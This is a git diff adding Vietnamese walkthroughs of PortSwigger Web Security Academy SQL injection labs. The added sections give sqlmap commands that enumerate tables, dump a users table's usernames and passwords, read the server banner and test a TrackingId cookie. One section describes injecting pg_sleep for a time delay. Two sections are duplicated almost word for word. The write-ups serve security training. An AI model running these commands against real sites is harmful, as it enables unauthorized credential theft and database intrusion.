@@ -6,20 +6,25 @@
 
 3. [Lab: SQL injection attack, querying the database type and version on Oracle](#lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle)
 
-4. [Lab: SQL injection attack, listing the database contents on non-Oracle databases](#lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases)
+4. [Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft](#lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft)
 
-5. [Lab: SQL injection attack, listing the database contents on Oracle](#lab-sql-injection-attack-listing-the-database-contents-on-oracle)
+5. [Lab: SQL injection attack, listing the database contents on non-Oracle databases](#lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases)
 
-6. [Lab: SQL injection UNION attack, determining the number of columns returned by the query](#lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query)
+6. [Lab: SQL injection attack, listing the database contents on Oracle](#lab-sql-injection-attack-listing-the-database-contents-on-oracle)
 
-7. [Lab: SQL injection UNION attack, finding a column containing text](#lab-sql-injection-union-attack-finding-a-column-containing-text)
+7. [Lab: SQL injection UNION attack, determining the number of columns returned by the query](#lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query)
 
-8. [Lab: SQL injection UNION attack, retrieving data from other tables](#lab-sql-injection-union-attack-retrieving-data-from-other-tables)
+8. [Lab: SQL injection UNION attack, finding a column containing text](#lab-sql-injection-union-attack-finding-a-column-containing-text)
 
-9. [Lab: SQL injection UNION attack, retrieving multiple values in a single column](#lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column)
+9. [Lab: SQL injection UNION attack, retrieving data from other tables](#lab-sql-injection-union-attack-retrieving-data-from-other-tables)
 
-10. [Lab: Blind SQL injection with time delays](#lab-blind-sql-injection-with-time-delays)
+10. [Lab: SQL injection UNION attack, retrieving multiple values in a single column](#lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column)
 
+11. [Lab: Blind SQL injection with conditional responses](#lab-blind-sql-injection-with-conditional-responses)
+
+12. [Lab: Blind SQL injection with conditional errors](#lab-blind-sql-injection-with-conditional-errors)
+
+13. [Lab: Blind SQL injection with time delays](#lab-blind-sql-injection-with-time-delays)
 ---
 
 # __Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data__
@@ -157,3 +162,90 @@ Access Lab, sử dụng Burp Suite để chặn và chỉnh sửa khi truy cập
 Ở đây là cột 2. Vì Lab yêu cầu hiển thị văn bản `zHh0BU` thay thế abc thành giá trị cần thiết và hoàn thành bài lab.
 
 ![alt text](images/image-28.png)
+
+
+# __Lab: SQL injection UNION attack, retrieving data from other tables__
+
+Acces Lab, truy cập vào 1 danh mục bất kì như Gifts hoặc là Pets. Lấy được URL, quay vào và sử dụng `sqlmap` để kiểm tra các lỗ hổng có trong bài lab. Ở đây để có thể hoàn thành được lab thì cần có được passwd của account `administrator` và đăng nhập. Bằng cách sử dụng lệnh:`python sqlmap.py -u "URL?category=Pets" --batch --tables --proxy="http://127.0.0.1:8080" --random-agent` khi này sqlmap sẽ tìm được các bảng bị ẩn hoặc k được public.
+
+![alt text](images/image-29.png)
+
+Sử dụng `python sqlmap.py -u "URL?category=Pets" --batch -T users --columns --proxy="http://127.0.0.1:8080" --random-agent` để thấy được các cột trong bảng user
+
+![alt text](images/image-30.png)
+
+Ở đây có thể thấy đã tìm được cột `username` và `password` sử dụng thêm lệnh `dump` để có thể đọc được dữ liệu trong các cột. `python sqlmap.py -u "https://0a1e007f032704a4801430c600b7001a.web-security-academy.net/filter?category=Pets" --batch -T users -C username,password --dump --proxy="http://127.0.0.1:8080" --random-agent `
+
+![alt text](images/image-31.png)
+
+Dùng `password` đã lấy được để đăng nhập vào account của `administrator` và hoàn thành bài lab.
+
+![alt text](images/image-32.png)
+
+
+# __Lab: SQL injection UNION attack, retrieving multiple values in a single column__
+
+Access Lab, truy cập vào 1 danh mục bất kì như Gifts hoặc là Pets. Lấy được URL, quay vào và sử dụng `sqlmap` để kiểm tra các lỗ hổng có trong bài lab. Ở đây để có thể hoàn thành được lab thì cần có được passwd của account `administrator` và đăng nhập. Bằng cách sử dụng lệnh:`python sqlmap.py -u "URL?category=Pets" --batch --tables --proxy="http://127.0.0.1:8080" --random-agent` khi này sqlmap sẽ tìm được các bảng bị ẩn hoặc k được public.
+
+![alt text](images/image-33.png)
+
+Sử dụng `python sqlmap.py -u "URL?category=Pets" --batch -T users --columns --proxy="http://127.0.0.1:8080" --random-agent` để thấy được các cột trong bảng user
+
+![alt text](images/image-34.png)
+
+Ở đây có thể thấy đã tìm được cột `username` và `password` sử dụng thêm lệnh `dump` để có thể đọc được dữ liệu trong các cột. `python sqlmap.py -u "https://0a1e007f032704a4801430c600b7001a.web-security-academy.net/filter?category=Pets" --batch -T users -C username,password --dump --proxy="http://127.0.0.1:8080" --random-agent `
+
+![alt text](images/image-35.png)
+
+Dùng `password` đã lấy được để đăng nhập vào account của `administrator` và hoàn thành bài lab.
+
+![alt text](images/image-36.png)
+
+
+# __Lab: Blind SQL injection with time delays__
+
+Access Lab, truy cập vào 1 danh mục bất kì như Gifts hoặc Pets. Sử dụng Burpsuite đêt bắt được `GET /filter?category=Gifts`.
+
+![alt text](images/image-37.png)
+
+Nhận thấy trong request có bao gồm cả TrackingID, để có thể solved được bài lab yêu cầu là khai thác lỗ hổng SQL injection để gây ra độ trễ 10 giây. Send to repeater và thêm hàm `pg_sleep` để gây ra độ trễ cho server.
+
+![alt text](images/image-38.png)
+
+Khi này bài lab đã được solved. 
+
+![alt text](images/image-39.png)
+
+
+# __Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft__
+
+Access Lab, Acces Lab, truy cập vào 1 danh mục bất kì như Gifts hoặc là Pets. Lấy được URL, quay vào và sử dụng `sqlmap` để kiểm tra các lỗ hổng có trong bài lab. Ở đây để có thể hoàn thành được lab thì cần khiến cho hiển thị được version `8.0.42-0ubuntu0.20.04.1`
+
+![alt text](images/image-40.png)
+
+Sử dụng `sqlmap` với flag `banner` để hiển thị version của server. `python sqlmap.py -u "https://0ab3002303d8b2e2808d12e600c50010.web-security-academy.net/filter?category=Pets" --batch --banner --proxy="http://127.0.0.1:8080" --random-agent`
+
+![alt text](images/image-41.png)
+
+Khi này bài lab sẽ được solved
+
+![alt text](images/image-42.png)
+
+
+# __Lab: Blind SQL injection with conditional responses__
+
+Access Lab, yêu cầu của bài lab là có thể khai thác lỗ hổng SQL để có thể đăng nhập được vào account `administrator`. Truy cập vào 1 danh mục bất kì của ứng dụng như Gifts hoặc Pets để Burpsuite có thể bát được request.
+
+![alt text](images/image-43.png)
+
+Thông thường các bài lab này thường sẽ có lỗ hổng ở `TrackingId` tiến hành sử sử dụng `sqlmap` để kiểm tra và xác định xem `TrackingId` có tồn tại lỗ hổng bằng: `python sqlmap.py -u "https://0a6d00d203b8ef438144a711007b00ca.web-security-academy.net/filter?category=Pets" --cookie="TrackingId=OPp4rq9WMsXxhke5*; session=dmVlsnPVDPoAQedwzp5em0Z6qtmLfByP" -p TrackingId --batch`
+
+![alt text](images/image-44.png)
+
+Khi này nhận thấy có tồn tại 3 lỗ hổng. Tiến hành trích xuất dữ liệu từ DB vì đã biết được có bảng `users` và chứ các cột `username`, `password` thực hiện lấy thông tin băng `dump`.
+
+![alt text](images/image-45.png)
+
+Sử dụng `password` đã lấy được để đăng nhập vào account `administrator` và hoàn thành bài lab.
+
+![alt text](images/image-46.png)
